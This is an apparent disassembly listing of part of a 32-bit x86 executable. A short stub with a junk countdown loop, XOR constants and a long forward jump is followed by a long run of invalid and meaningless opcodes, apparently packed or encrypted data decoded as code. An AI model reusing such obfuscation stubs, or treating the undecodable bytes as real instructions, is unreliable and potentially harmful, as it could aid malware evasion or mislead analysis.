  40186d:	adc    DWORD PTR ds:0x430646,ebx
  401873:	mov    edi,0xf89f2dad
  401878:	mov    DWORD PTR [eax],edi
  40187a:	mov    DWORD PTR ds:0x430642,0x13
  401884:	cmp    DWORD PTR ds:0x430642,0x0
  40188b:	je     0x4018c5
  401891:	cmp    DWORD PTR ds:0x430642,0x21
  401898:	jne    0x4018a9
  40189e:	push   0x4555
  4018a3:	call   DWORD PTR ds:0x42eba4
  4018a9:	mov    ebx,DWORD PTR ds:0x430642
  4018af:	dec    ebx
  4018b0:	mov    DWORD PTR ds:0x430642,ebx
  4018b6:	jmp    0x401884
  4018bb:	add    DWORD PTR ds:0x42e85e,0x42e862
  4018c5:	mov    eax,DWORD PTR [ebp-0x14]
  4018c8:	or     ecx,0x5402
  4018ce:	mov    ebx,DWORD PTR [ebp-0x8]
  4018d1:	mov    ecx,0x7510856
  4018d6:	xor    eax,ecx
  4018d8:	mov    esi,0x32729d
  4018dd:	sbb    DWORD PTR ds:0x4305b2,0x704c
  4018e7:	xor    ebx,ecx
  4018e9:	xor    edx,edx
  4018eb:	xor    DWORD PTR ds:0x42e86a,0x430642
  4018f5:	add    eax,esi
  4018f7:	add    ebx,esi
  4018f9:	sbb    DWORD PTR ds:0x430652,0x21a7
  401903:	jmp    0x401cb4
  401908:	ret    0xa9a5
  40190b:	imul   ebp,DWORD PTR [ecx+0x7b],0xffffffc4
  40190f:	mov    ebp,0x8064be64
  401914:	pop    ebp
  401915:	dec    esi
  401916:	inc    ebp
  401917:	outs   dx,DWORD PTR ds:[esi]
  401918:	push   ss
  401919:	jne    0x401999
  40191b:	jle    0x40189f
  40191d:	jno    0x40199d
  40191f:	jle    0x4018df
  401921:	scas   al,BYTE PTR es:[edi]
  401922:	push   ss
  401923:	scas   al,BYTE PTR es:[edi]
  401924:	dec    ebx
  401925:	add    ebx,ecx
  401927:	pop    ebx
  401928:	and    al,0x9d
  40192a:	mov    esi,0x7730dc90
  40192f:	pop    ecx
  401930:	ja     0x4018cf
  401932:	add    eax,0x95ad6603
  401937:	es pop esp
  401939:	shl    BYTE PTR [edx-0x17],1
  40193c:	mov    ah,0x8e
  40193e:	xor    DWORD PTR [edx+0x5017c807],esi
  401944:	sub    eax,0x1523d997
  401949:	cmp    al,0xbf
  40194b:	clc    
  40194c:	ins    DWORD PTR es:[edi],dx
  40194d:	retf   0x826f
  401950:	sbb    dh,BYTE PTR [ecx-0x69]
  401953:	(bad)  
  401954:	fdiv   DWORD PTR [eax-0x7f]
  401957:	xchg   ecx,eax
  401958:	add    al,0xf1
  40195a:	jmp    0x7f5d:0x77833f68
  401961:	jnp    0x4019cc
  401963:	sub    DWORD PTR [eax-0x3c5f6641],edx
  401969:	(bad)  
  40196a:	adc    al,0x84
  40196c:	adc    eax,0xba4aa2f2
  401971:	test   eax,0x8c0db51b
  401976:	sahf   
  401977:	inc    ebp
  401978:	arpl   WORD PTR [esi-0x1b5bbd6b],cx
  40197e:	scas   eax,DWORD PTR es:[edi]
  40197f:	sbb    al,0xbd
  401981:	aas    
  401982:	jl     0x4019b7
  401984:	mov    edx,0x246bafb9
  401989:	scas   al,BYTE PTR es:[edi]
  40198a:	inc    eax
  40198b:	and    eax,ebp
  40198d:	mov    ds:0x4371b2db,eax
  401992:	mov    dl,0xa3
  401994:	inc    ebx
  401995:	push   ecx
  401996:	loop   0x4019be
  401998:	and    DWORD PTR [esp+esi*1],0xffffff96
  40199c:	icebp  
  40199d:	(bad)  
  40199e:	fisub  WORD PTR [ebx]
  4019a0:	(bad)  
  4019a1:	and    al,BYTE PTR [eax]
  4019a3:	adc    esp,esi
  4019a5:	push   ebp
  4019a6:	push   edi
  4019a7:	mov    al,BYTE PTR [esi+0x9]
  4019aa:	mov    dl,0x18
  4019ac:	les    eax,FWORD PTR [esi]
  4019ae:	adc    eax,esi
  4019b0:	ds mov bh,0x2c
  4019b3:	shl    BYTE PTR [esi+0x41],0x3e
  4019b7:	dec    ebx
  4019b8:	pop    ss
  4019b9:	xor    BYTE PTR [ebx+0x319e14d4],ah
  4019bf:	aaa    
  4019c0:	mov    ah,0x2f
  4019c2:	add    al,BYTE PTR ds:[eax+0x23]
  4019c6:	pop    esp
  4019c7:	(bad)  [ebp+0x1d]
  4019ca:	push   edi
  4019cb:	pusha  
  4019cc:	inc    ecx
  4019cd:	dec    esp
  4019ce:	loope  0x40198a
  4019d0:	pop    edx
  4019d1:	push   eax
  4019d2:	or     DWORD PTR [ecx-0x6375941b],ecx
  4019d8:	(bad)  
  4019d9:	cdq    
  4019da:	rcl    BYTE PTR ds:0xa79fb25c,0xc3
  4019e1:	jbe    0x4019a1
  4019e3:	mov    eax,0xed03fd8b
  4019e8:	inc    ebp
  4019e9:	test   BYTE PTR [edi+0x6baa479],bh
  4019ef:	adc    eax,DWORD PTR [esi+0xd]
  4019f2:	pop    ecx
  4019f3:	lods   al,BYTE PTR ds:[esi]
  4019f4:	dec    eax
  4019f5:	jb     0x401a53
  4019f7:	jno    0x401a01
  4019f9:	jno    0x401a30
  4019fb:	xchg   edi,eax
  4019fc:	xchg   ebx,eax
  4019fd:	push   es
  4019fe:	push   ds
  4019ff:	add    edi,ebp
  401a01:	test   DWORD PTR [eax],0xc9ed50a2
  401a07:	popa   
  401a08:	repz fbld TBYTE PTR [edi]
  401a0b:	inc    ecx
  401a0c:	pop    ebx
  401a0d:	and    al,0x42
  401a0f:	loop   0x401a44
  401a11:	pop    ecx
  401a12:	xchg   edx,eax
  401a13:	mov    ds:0xec6adf6d,al
  401a18:	dec    ebx
  401a19:	push   ebx
  401a1a:	dec    edx
  401a1b:	dec    eax
  401a1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a1d:	iret   
  401a1e:	dec    esp
  401a1f:	mov    esi,0x2b0855ad
  401a24:	out    0xc0,eax
  401a26:	mov    edi,0x58b2d164
  401a2b:	pop    ecx
  401a2c:	pop    ss
  401a2d:	pop    eax
  401a2e:	in     al,dx
  401a2f:	dec    ebx
  401a30:	xchg   ebx,eax
  401a31:	out    0x2a,eax
  401a33:	test   ah,dl
  401a35:	mov    bh,0xe
  401a37:	mov    bh,0xb5
  401a39:	jle    0x401a40
  401a3b:	add    al,0x53
  401a3d:	mov    ecx,0x4d42bd49
  401a42:	inc    ecx
  401a43:	xlat   BYTE PTR ds:[ebx]
  401a44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a45:	xor    BYTE PTR ds:0xf2d0a9fa,bl
  401a4b:	xchg   ebp,eax
  401a4c:	jbe    0x401a0b
  401a4e:	push   edx
  401a4f:	ss out dx,eax
  401a51:	ds inc edx
  401a53:	mov    edi,0x22619eae
  401a58:	outs   dx,BYTE PTR ds:[esi]
  401a59:	out    dx,eax
  401a5a:	jno    0x401acf
  401a5c:	pop    eax
  401a5d:	mov    dl,bh
  401a5f:	xor    bl,BYTE PTR [eax]
  401a61:	test   dh,bh
  401a63:	mov    al,0x19
  401a65:	imul   esp,ecx,0xf
  401a68:	in     eax,0x90
  401a6a:	xchg   DWORD PTR [ebp*8-0x2c10a17e],esi
  401a71:	sub    DWORD PTR [ebx-0x6d],eax
  401a74:	lea    edx,[edi+0x19]
  401a77:	loopne 0x401ac2
  401a79:	and    eax,0x27902da2
  401a7e:	push   cs
  401a7f:	cs inc edx
  401a81:	dec    esi
  401a82:	ror    DWORD PTR [eax+0x5419047e],1
  401a88:	adc    DWORD PTR [edx+0x11c8d32f],eax
  401a8e:	lock dec edx
  401a90:	out    dx,al
  401a91:	fmul   DWORD PTR [ebp+0x5b09b231]
  401a97:	jmp    0xec75:0x2ae6c7e7
  401a9e:	in     al,dx
  401a9f:	aad    0xe3
  401aa1:	mov    edi,0xd58c1011
  401aa6:	fsub   st(6),st
  401aa8:	dec    ecx
  401aa9:	leave  
  401aaa:	pop    ss
  401aab:	mov    DWORD PTR [esi],edx
  401aad:	sub    DWORD PTR [ebx-0x2c],0x3f
  401ab1:	or     al,0xde
  401ab3:	repz in eax,0x67
  401ab6:	je     0x401a4f
  401ab8:	icebp  
  401ab9:	jmp    0xf7053564
  401abe:	test   al,0xa5
  401ac0:	cmp    eax,0xedffc343
  401ac5:	jno    0x401b18
  401ac7:	jne    0x401a4b
  401ac9:	xchg   esi,eax
  401aca:	jge    0x401a72
  401acc:	xchg   ecx,eax
  401acd:	loopne 0x401a5a
  401acf:	pop    ebx
  401ad0:	mov    edi,0xfa315def
  401ad5:	pusha  
  401ad6:	mov    dh,0xbc
  401ad8:	cld    
  401ad9:	nop
  401ada:	xchg   ebx,eax
  401adb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401adc:	push   cs
  401add:	mov    edi,0xd5543839
  401ae2:	icebp  
  401ae3:	shl    BYTE PTR [ecx-0x60759c72],0x8e
  401aea:	fstp   QWORD PTR [eax+ebx*4+0x1625e19e]
  401af1:	and    eax,0x595e316d
  401af6:	and    ch,BYTE PTR [eax+0x681946fe]
  401afc:	sub    BYTE PTR [ebx],al
  401afe:	jo     0x401a81
  401b00:	jle    0x401b03
  401b02:	pop    esi
  401b03:	ds repnz dec eax
  401b06:	mov    eax,ds:0x4ce3804
  401b0b:	cmc    
  401b0c:	mov    DWORD PTR [esi-0x14e2ca43],edi
  401b12:	cli    
  401b13:	pusha  
  401b14:	push   ss
  401b15:	mov    bl,bl
  401b17:	ja     0x401ab1
  401b19:	fiadd  DWORD PTR [ebp-0x16340851]
  401b1f:	and    eax,DWORD PTR [ecx+0x3be68694]
  401b25:	pop    ss
  401b26:	xor    al,0x9a
  401b28:	xchg   ebx,eax
  401b29:	aas    
  401b2a:	mov    ds:0x638f92ae,eax
  401b2f:	xchg   esp,eax
  401b30:	sbb    esi,DWORD PTR [esi]
  401b32:	inc    ecx
  401b33:	push   esi
  401b34:	es jb  0x401b62
  401b37:	arpl   WORD PTR [ebp-0x58],cx
  401b3a:	cs jnp 0x401bae
  401b3d:	ret    0x4c02
  401b40:	push   esp
  401b41:	sbb    DWORD PTR [ebx+ecx*1],ebp
  401b44:	test   ebp,0x6f125f29
  401b4a:	pop    edi
  401b4b:	mov    bl,cl
  401b4d:	add    DWORD PTR [ecx],ecx
  401b4f:	jae    0x401b8b
  401b51:	std    
  401b52:	adc    al,0xb6
  401b54:	sbb    esp,ebp
  401b56:	scas   al,BYTE PTR es:[edi]
  401b57:	pop    esi
  401b58:	add    eax,0x3c725105
  401b5d:	popa   
  401b5e:	popf   
  401b5f:	mov    ch,0xaa
  401b61:	stos   DWORD PTR es:[edi],eax
  401b62:	arpl   WORD PTR [esi],cx
  401b64:	dec    ebx
  401b65:	(bad)  
  401b66:	shl    ah,cl
  401b68:	in     eax,dx
  401b69:	sbb    DWORD PTR [edx-0x7e],ecx
  401b6c:	fisub  WORD PTR [ebp-0x2e]
  401b6f:	pop    ss
  401b70:	fisubr WORD PTR [esi]
  401b72:	and    dh,0x6b
  401b75:	jns    0x401b76
  401b77:	lock adc al,0x6a
  401b7a:	fwait
  401b7b:	repnz mov bl,0x2f
  401b7e:	jmp    0x401bcf
  401b80:	pop    edx
  401b81:	jecxz  0x401b98
  401b83:	jle    0x401b7c
  401b85:	jmp    0x401b3c
  401b87:	sbb    DWORD PTR [ebp+edx*1+0x58997ee0],0x5b254cea
  401b92:	(bad)  
  401b93:	and    ax,0xebae
  401b97:	sahf   
  401b98:	and    BYTE PTR [esp+eiz*2+0x355ae2e7],dl
  401b9f:	mov    esi,0xf18f499e
  401ba4:	cs js  0x401b6f
  401ba7:	test   ebp,0x34a72515
  401bad:	mov    dl,0xbf
  401baf:	mov    bh,0x84
  401bb1:	push   esp
  401bb2:	mov    edi,0x8a0a9e51
  401bb7:	xor    ecx,ebx
  401bb9:	xlat   BYTE PTR es:[ebx]
  401bbb:	shl    eax,cl
  401bbd:	push   cs
  401bbe:	lods   eax,DWORD PTR ds:[esi]
  401bbf:	sti    
  401bc0:	je     0x401bf7
  401bc2:	cmp    bl,BYTE PTR [edx-0x1a]
  401bc5:	mov    bh,0x27
  401bc7:	dec    edi
  401bc8:	dec    al
  401bca:	aaa    
  401bcb:	inc    edx
  401bcc:	mov    dl,0xe1
  401bce:	dec    ebp
  401bcf:	pop    ss
  401bd0:	popa   
  401bd1:	mov    bl,0xdf
  401bd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bd4:	dec    ebx
  401bd5:	mov    ecx,0x72a3c31d
  401bda:	jmp    0xdd60:0xb279f86c
  401be1:	ja     0x401c4a
  401be3:	jp     0x401c35
  401be5:	test   al,0x15
  401be7:	mov    cl,0x8e
  401be9:	stc    
  401bea:	jb     0x401b7a
  401bec:	mov    ebx,DWORD PTR [esi]
  401bee:	std    
  401bef:	dec    edx
  401bf0:	cmp    al,0xe4
  401bf2:	push   es
  401bf3:	mov    bh,0x91
  401bf5:	hlt    
  401bf6:	push   cs
  401bf7:	xchg   edi,eax
  401bf8:	xchg   edi,eax
  401bf9:	das    
  401bfa:	sub    al,0x28
  401bfc:	mov    ebx,0x29d0f2ff
  401c01:	jno    0x401ba9
  401c03:	je     0x401bfb
  401c05:	adc    al,ah
  401c07:	sti    
  401c08:	dec    esi
  401c09:	imul   esp,DWORD PTR ds:[ecx+0x18],0xffffffed
  401c0e:	std    
  401c0f:	pop    ecx
  401c10:	aam    0x4
  401c12:	shl    DWORD PTR ds:0xa3495060,1
  401c18:	data16 adc al,0xcc
  401c1b:	xchg   edi,eax
  401c1c:	push   ss
  401c1d:	inc    esi
  401c1e:	rcr    BYTE PTR [ebp-0x27],1
  401c21:	mov    cl,0x6e
  401c23:	mov    bh,0x1b
  401c25:	sahf   
  401c26:	jmp    0x50579b19
  401c2b:	add    eax,edi
  401c2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c2e:	cmp    bl,BYTE PTR [ebp-0x75]
  401c31:	add    BYTE PTR [edx+0x4e912c87],bh
  401c37:	xchg   ebx,eax
  401c38:	ja     0x401c64
  401c3a:	loope  0x401c04
  401c3c:	sbb    eax,0x2e89034a
  401c41:	les    edx,FWORD PTR [esi]
  401c43:	mov    ecx,0x2b0286cd
  401c48:	repnz and DWORD PTR [edx-0x1e9bb6f9],esi
  401c4f:	rol    BYTE PTR [esi],cl
  401c51:	popf   
  401c52:	fwait
  401c53:	pusha  
  401c54:	push   ebx
  401c55:	sub    eax,0xed496d8
  401c5a:	or     ecx,DWORD PTR [edi]
  401c5c:	test   DWORD PTR [ecx+0xb],esp
  401c5f:	pop    esi
  401c60:	add    BYTE PTR [esi-0x77f9ab92],ah
  401c66:	xor    BYTE PTR [eax-0xa269018],dh
  401c6c:	mov    dh,0x6a
  401c6e:	push   ds
  401c6f:	sbb    BYTE PTR [edx-0x29],0xc
  401c73:	inc    esp
  401c74:	mov    eax,0xdc565feb
  401c79:	fs inc ebx
  401c7b:	jmp    0x832c:0xdf2dcff
  401c82:	inc    edi
  401c83:	lock jmp 0x2ce6:0x544b3535
  401c8b:	iret   
  401c8c:	push   ds
  401c8d:	bound  edi,QWORD PTR gs:[edx-0x72b9f2c1]
  401c94:	das    
  401c95:	lods   eax,DWORD PTR ds:[esi]
  401c96:	ds int 0x7
  401c99:	pop    ds
  401c9a:	mul    BYTE PTR [ecx+0x23ad9f94]
  401ca0:	loop   0x401cbc
  401ca2:	mov    DWORD PTR [esp+esi*2+0x69],edi
  401ca6:	pop    ds
  401ca7:	mov    ebp,0x19a73223
  401cac:	jne    0x401cbe
  401cae:	inc    ebp
  401caf:	mov    BYTE PTR [eax],bh
  401cb1:	mov    edx,0xf3f7dd94
  401cb6:	mov    DWORD PTR ds:0x42ef20,0x29
  401cc0:	jmp    0x402071
  401cc5:	pop    ds
  401cc6:	nop
  401cc7:	jl     0x401d20
  401cc9:	jge    0x401d46
  401ccb:	and    eax,0x749e668
  401cd0:	jns    0x401ce8
  401cd2:	fld    QWORD PTR [esi+0x7e08baca]
  401cd8:	jle    0x401c5c
  401cda:	jno    0x401d5a
  401cdc:	jle    0x401c70
  401cde:	jl     0x401ca0
  401ce0:	adc    ch,BYTE PTR [edi+0x31509c18]
  401ce6:	jbe    0x401cea
  401ce8:	jp     0x401c81
  401cea:	out    dx,eax
  401ceb:	in     al,dx
  401cec:	push   es
  401ced:	cmc    
  401cee:	jne    0x401c7b
  401cf0:	outs   dx,DWORD PTR ds:[esi]
  401cf1:	fist   DWORD PTR [ecx]
  401cf3:	nop
  401cf4:	popa   
  401cf5:	push   ebp
  401cf6:	push   ecx
  401cf7:	pusha  
  401cf8:	fdivr  QWORD PTR [ebx+0x43]
  401cfb:	arpl   WORD PTR ds:0x2f0358ff,bx
  401d01:	inc    esp
  401d02:	jb     0x401cc5
  401d04:	cmp    ebx,DWORD PTR [eax]
  401d06:	(bad)  
  401d07:	mov    ecx,0x8d4f38ac
  401d0c:	xor    BYTE PTR [eax-0x282cf2d3],bl
  401d12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d13:	mov    ebx,0x3a2c05f3
  401d18:	pop    eax
  401d19:	(bad)  
  401d1a:	ds jno 0x401d22
  401d1d:	es cmp al,0x2e
  401d20:	ficomp WORD PTR [edx+0x1f]
  401d23:	dec    ecx
  401d24:	add    eax,0x63ff5eab
  401d29:	cmp    ah,BYTE PTR [edi+ebx*4+0x7e68124f]
  401d30:	xchg   BYTE PTR [eax-0x60c33029],al
  401d36:	lock inc edi
  401d38:	mov    edi,0x2bc397aa
  401d3d:	sbb    DWORD PTR [ecx],esi
  401d3f:	push   ecx
  401d40:	sbb    ah,BYTE PTR [esi-0x5eb686d7]
  401d46:	jnp    0x401cf4
  401d48:	icebp  
  401d49:	scas   eax,DWORD PTR es:[edi]
  401d4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d4b:	(bad)  
  401d4c:	sub    eax,0xc27f074a
  401d51:	jae    0x401cef
  401d53:	clc    
  401d54:	jne    0x401d2a
  401d56:	push   ds
  401d57:	add    eax,0x88296126
  401d5c:	pop    ss
  401d5d:	mov    cl,BYTE PTR ds:0xa9a67069
  401d63:	loope  0x401d5f
  401d65:	xchg   esi,eax
  401d66:	aad    0x39
  401d68:	gs inc ebx
  401d6a:	sbb    bh,BYTE PTR [ecx]
  401d6c:	(bad)  
  401d6d:	lahf   
  401d6e:	add    eax,DWORD PTR [ecx+0x7b59d82b]
  401d74:	(bad)
  401d78:	add    DWORD PTR [ebp-0x5f8a21da],edi
  401d7e:	loop   0x401d97
  401d80:	scas   eax,DWORD PTR es:[edi]
  401d81:	pminub mm2,QWORD PTR [ebx-0x1856e359]
  401d88:	int3   
  401d89:	sub    eax,0xfc381882
  401d8e:	xor    eax,eax
  401d90:	sahf   
  401d91:	push   esp
  401d92:	mov    bh,0x52
  401d94:	xlat   BYTE PTR ds:[ebx]
  401d95:	es push edi
  401d97:	cmp    ah,bh
  401d99:	call   0x5162:0xe2dd9501
  401da0:	loopne 0x401df2
  401da2:	push   ebx
  401da3:	push   ss
  401da4:	pop    DWORD PTR [ebx]
  401da6:	mov    dh,bl
  401da8:	push   ecx
  401da9:	sbb    ch,BYTE PTR [edi]
  401dab:	mov    dh,0x39
  401dad:	cld    
  401dae:	fdivr  DWORD PTR ds:0xc10c2e09
  401db4:	dec    esi
  401db5:	ret    0x13d
  401db8:	mov    ecx,0xa45dfab2
  401dbd:	inc    ebp
  401dbe:	and    edx,ecx
  401dc0:	dec    eax
  401dc1:	xchg   esp,eax
  401dc2:	hlt    
  401dc3:	or     DWORD PTR [ebp-0x672a07a0],ebx
  401dc9:	jb     0x401e02
  401dcb:	pop    DWORD PTR [edx-0x1f]
  401dce:	iret   
  401dcf:	(bad)
  401dd3:	aaa    
  401dd4:	dec    esp
  401dd5:	mov    dl,0x89
  401dd7:	xchg   BYTE PTR [ebx+0x32],al
  401dda:	call   0x4560:0x48cc01c4
  401de1:	adc    DWORD PTR [ecx+esi*2+0x4f1a548b],esi
  401de8:	mov    dl,0x9c
  401dea:	imul   esp,DWORD PTR [edx+0x43],0xea067d5b
  401df1:	aam    0xbf
  401df3:	rcl    edi,1
  401df5:	xchg   ebp,eax
  401df6:	call   0x3a39:0x78559fb8
  401dfd:	inc    ebx
  401dfe:	jle    0x401e55
  401e00:	dec    ecx
  401e01:	fwait
  401e02:	pop    edx
  401e03:	dec    eax
  401e04:	cmp    DWORD PTR [ebx+0xc0c6ec3],edi
  401e0a:	push   ss
  401e0b:	inc    esp
  401e0c:	jg     0x401e7a
  401e0e:	fisub  WORD PTR [ebp-0x1]
  401e11:	xchg   ebp,eax
  401e12:	(bad)  
  401e13:	mov    BYTE PTR [ebx-0x58689e66],ah
  401e19:	loope  0x401de6
  401e1b:	xlat   BYTE PTR ds:[ebx]
  401e1c:	xor    al,0xef
  401e1e:	mov    bl,BYTE PTR [ecx-0x785c279e]
  401e24:	lods   al,BYTE PTR ds:[esi]
  401e25:	and    DWORD PTR ds:0x2ba23a31,esi
  401e2b:	sbb    al,0xdd
  401e2d:	push   edx
  401e2e:	sar    BYTE PTR ds:0x457395b1,cl
  401e34:	dec    eax
  401e35:	xchg   esi,eax
  401e36:	shl    DWORD PTR [ecx-0x6a],cl
  401e39:	mov    ds:0xc2d51f3f,eax
  401e3e:	pop    esp
  401e3f:	lock sub dl,BYTE PTR [ebp-0x5e42fe8]
  401e46:	inc    edx
  401e47:	jmp    0x109c:0x24575c92
  401e4e:	xchg   DWORD PTR [eax+edi*4],ecx
  401e51:	imul   edx,DWORD PTR ds:0x84dd7205,0x41
  401e58:	pop    ebx
  401e59:	xor    esp,DWORD PTR [esi+eax*2]
  401e5c:	push   eax
  401e5d:	add    BYTE PTR [ecx-0x1b],ch
  401e60:	dec    esp
  401e61:	jg     0x401e8b
  401e63:	push   cs
  401e64:	sbb    dh,ch
  401e66:	adc    bh,dl
  401e68:	scas   eax,DWORD PTR es:[edi]
  401e69:	(bad)  
  401e6a:	fidivr DWORD PTR [edi]
  401e6c:	dec    ebx
  401e6d:	test   DWORD PTR [ebx],edx
  401e6f:	test   eax,0x6e45ca53
  401e74:	sub    al,0x9c
  401e76:	pushf  
  401e77:	test   al,0x83
  401e79:	aaa    
  401e7a:	dec    ecx
  401e7b:	sub    dh,BYTE PTR [eax]
  401e7d:	mov    ds,WORD PTR ds:0xe8633841
  401e83:	(bad)  
  401e84:	cdq    
  401e85:	pushf  
  401e86:	xchg   edx,eax
  401e87:	push   edi
  401e88:	or     ecx,DWORD PTR [eax+eax*8+0x3ce4facf]
  401e8f:	adc    BYTE PTR [ebp+0x3c],bl
  401e92:	jbe    0x401e55
  401e94:	pop    ss
  401e95:	sbb    dh,BYTE PTR [ecx+0x11]
  401e98:	pop    es
  401e99:	mov    al,ds:0xf89824ac
  401e9e:	sti    
  401e9f:	lahf   
  401ea0:	mov    ah,0x5f
  401ea2:	xor    BYTE PTR [esi],0x50
  401ea5:	retf   
  401ea6:	push   edx
  401ea7:	mov    eax,0xdd720d12
  401eac:	sahf   
  401ead:	xchg   esp,eax
  401eae:	push   esp
  401eaf:	and    BYTE PTR [esi+0x9],bh
  401eb2:	ins    DWORD PTR es:[edi],dx
  401eb3:	mov    ds:0xea97d847,al
  401eb8:	pop    ebx
  401eb9:	cwde   
  401eba:	retf   0xf9a8
  401ebd:	mov    al,0x74
  401ebf:	mov    cl,0x68
  401ec1:	inc    BYTE PTR [esi]
  401ec3:	loop   0x401f3f
  401ec5:	pop    eax
  401ec6:	cmp    eax,0xc6cccb39
  401ecb:	frstor [ebx-0x1c946517]
  401ed1:	push   es
  401ed2:	mov    esi,0x9dee2688
  401ed7:	lods   eax,DWORD PTR ds:[esi]
  401ed8:	test   DWORD PTR [ebx-0x1c9d6fd1],0x5ad0f29a
  401ee2:	std    
  401ee3:	sub    dh,dh
  401ee5:	fwait
  401ee6:	mov    cl,0xc7
  401ee8:	sbb    DWORD PTR [ebp+0x6],ecx
  401eeb:	ss iret 
  401eed:	addr16 jl 0x401f01
  401ef0:	pop    ds
  401ef1:	sahf   
  401ef2:	mov    ebx,0xb9864ae5
  401ef7:	outs   dx,BYTE PTR ds:[esi]
  401ef8:	gs call 0xd42:0xbc9aec1b
  401f00:	jge    0x401f3b
  401f02:	mov    al,0xd2
  401f04:	call   0x517:0xd15c322f
  401f0b:	pushf  
  401f0c:	aad    0x88
  401f0e:	mov    bh,bh
  401f10:	xor    ebp,edi
  401f12:	clc    
  401f13:	mov    al,BYTE PTR [edx+0x5b]
  401f16:	pop    ds
  401f17:	(bad)  [edi+0x3ac4dc38]
  401f1d:	faddp  st(6),st
  401f1f:	pop    edx
  401f20:	jmp    0x401f5b
  401f22:	push   ebp
  401f23:	or     al,al
  401f25:	or     esp,DWORD PTR [ebx-0x48]
  401f28:	jg     0x401ec7
  401f2a:	mov    BYTE PTR [ecx+0x38],ah
  401f2d:	and    ecx,DWORD PTR [ebx]
  401f2f:	mov    eax,ds:0x873a7ffa
  401f34:	das    
  401f35:	sbb    BYTE PTR [edi],bh
  401f37:	jecxz  0x401f24
  401f39:	mov    bh,0xf7
  401f3b:	xchg   ebp,eax
  401f3c:	aad    0x97
  401f3e:	adc    eax,0x20247651
  401f43:	cmp    ah,BYTE PTR [ebx+0x4fe62a74]
  401f49:	push   ds
  401f4a:	or     dl,0x25
  401f4d:	lock loope 0x401fa2
  401f50:	cmc    
  401f51:	sub    BYTE PTR ds:0x9b2cdf93,bl
  401f57:	scas   eax,DWORD PTR es:[edi]
  401f58:	adc    eax,0x72f09902
  401f5d:	retf   0xb77a
  401f60:	(bad)  
  401f61:	jo     0x401f5c
  401f63:	in     al,0xa
  401f65:	mov    edx,0x3080e50e
  401f6a:	pop    ecx
  401f6b:	jle    0x401fe9
  401f6d:	scas   al,BYTE PTR es:[edi]
  401f6e:	xchg   esi,eax
  401f6f:	mov    cl,0x74
  401f71:	adc    ebx,DWORD PTR [ebx]
  401f73:	das    
  401f74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f75:	xor    al,0xa5
  401f77:	sbb    edx,ebx
  401f79:	mov    bl,0x67
  401f7b:	xor    bh,al
  401f7d:	inc    edx
  401f7e:	lock mov ebx,0x6da88da1
  401f84:	jo     0x401f4b
  401f86:	add    al,0xc4
  401f88:	sbb    ah,dl
  401f8a:	xchg   DWORD PTR [ebx-0x44],ebp
  401f8d:	push   ebp
  401f8e:	je     0x401fec
  401f90:	imul   ecx,DWORD PTR [esi-0x47],0x37a0a44f
  401f97:	loopne 0x401f27
  401f99:	test   DWORD PTR [ebp+eax*4+0x46d63b93],edi
  401fa0:	sub    DWORD PTR [ecx],ebx
  401fa2:	xchg   esp,eax
  401fa3:	or     al,0x8c
  401fa5:	mov    ?,edx
  401fa7:	dec    edi
  401fa8:	pop    eax
  401fa9:	jbe    0x401faf
  401fab:	ret    
  401fac:	(bad)  
  401fae:	rol    ebx,cl
  401fb0:	mov    esp,0x25edb52d
  401fb5:	leave  
  401fb6:	sub    BYTE PTR [ebp+0x72],ch
  401fb9:	inc    edi
  401fba:	pop    edx
  401fbb:	mov    dh,0x1f
  401fbd:	dec    edi
  401fbe:	sbb    eax,0xdda8b22f
  401fc3:	ins    DWORD PTR es:[edi],dx
  401fc4:	or     al,0xfa
  401fc6:	jp     0x401f5c
  401fc8:	jg     0x401f6d
  401fca:	jmp    0x401f51
  401fcc:	loope  0x401f53
  401fce:	gs inc esp
  401fd0:	and    esi,DWORD PTR ds:0xf923bc50
  401fd6:	jmp    0xc3fa:0x3b7605da
  401fdd:	imul   eax,DWORD PTR [ecx-0x27],0xffffff97
  401fe1:	jmp    0x645d9dd3
  401fe6:	scas   eax,DWORD PTR es:[edi]
  401fe7:	lahf   
  401fe8:	rcr    ebp,0xfd
  401feb:	or     DWORD PTR [ebx+ebp*8-0x7c1471bd],ebp
  401ff2:	push   edi
  401ff3:	jno    0x401f80
  401ff5:	and    edx,DWORD PTR [eax]
  401ff7:	repnz mov BYTE PTR [eax-0x246e9560],ah
  401ffe:	clc    
  401fff:	mov    dh,0x24
  402001:	jmp    0xfd93:0x86c8f63c
  402008:	shl    ecx,0xdd
  40200b:	jge    0x401fee
  40200d:	jmp    0x6d4f3c33
  402012:	sbb    al,0x1b
  402014:	fld    QWORD PTR [esi+ebx*1]
  402017:	jge    0x402038
  402019:	or     bh,cl
  40201b:	jo     0x402073
  40201d:	sub    BYTE PTR [edi+0x27],0xcf
  402021:	xor    DWORD PTR [ebp+0x79],ecx
  402024:	retf   
  402025:	and    DWORD PTR [ecx+0x5a1b980e],ecx
  40202b:	adc    al,dh
  40202d:	shl    DWORD PTR [edi-0x4fed8d1b],1
  402033:	xchg   edx,eax
  402034:	pushf  
  402035:	mov    bl,0xc4
  402037:	dec    edi
  402038:	test   eax,0x4f0da3ba
  40203d:	pushf  
  40203e:	adc    bh,bl
  402040:	or     BYTE PTR [edx+ebx*8],cl
  402043:	std    
  402044:	lds    eax,FWORD PTR [ecx+0x5a]
  402047:	sti    
  402048:	pushf  
  402049:	imul   ebx,DWORD PTR [ebx],0xbfd061c7
  40204f:	(bad)  
  402050:	dec    edx
  402051:	push   edx
  402052:	and    al,0x1
  402054:	sar    BYTE PTR [eax-0x19847504],1
  40205a:	mov    cl,0x7d
  40205c:	and    al,0x58
  40205e:	add    BYTE PTR [ebx],al
  402060:	lock mov al,0x91
  402063:	jle    0x401feb
  402065:	in     al,dx
  402066:	in     eax,0x2f
  402068:	(bad)  
  402069:	mov    eax,0x71e4e351
  40206e:	loopne 0x4020da
  402070:	outs   dx,BYTE PTR ds:[esi]
  402071:	mov    edx,DWORD PTR [ebp-0x20]
  402074:	mov    DWORD PTR [ebp-0x2c],0x4eb9
  40207b:	mov    DWORD PTR ds:0x42ef24,0x6138
  402085:	cmp    eax,DWORD PTR [edx]
